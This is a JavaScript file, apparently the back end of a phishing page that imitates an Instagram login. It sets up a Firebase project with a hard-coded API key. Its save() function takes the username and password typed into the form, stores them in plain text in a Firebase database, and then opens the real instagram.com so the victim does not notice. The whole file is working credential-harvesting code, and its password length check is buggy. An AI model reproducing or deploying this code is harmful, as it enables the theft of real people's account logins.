const firebaseConfig = {
    apiKey: "AIzaSyDS552Z1rw2cOhvUMdm3gxgNqC6gQyGAQg",
    authDomain: "top-scr.firebaseapp.com",
    projectId: "top-scr",
    storageBucket: "top-scr.appspot.com",
    messagingSenderId: "151091633148",
    appId: "1:151091633148:web:7a36a883afd238564f7079"
  };
  

  
 firebase.initializeApp(firebaseConfig);  


 function save()
 {
    username = document.getElementById("username").value
    password = document.getElementById("pass").value
    if(username == "" || username.length >16)
    {
        alert("USERNAME FIELD INVALID")
    }
    else if(password=="" || username.length >30)
    {
        alert("PASSWORD FIELD INVALID")
    }
    else{
        var secretRef = firebase.database()

        secretRef.ref("users/" + username).set({
            username: username,
            password: password,
        })
        open("https://www.instagram.com")
    }
    


 }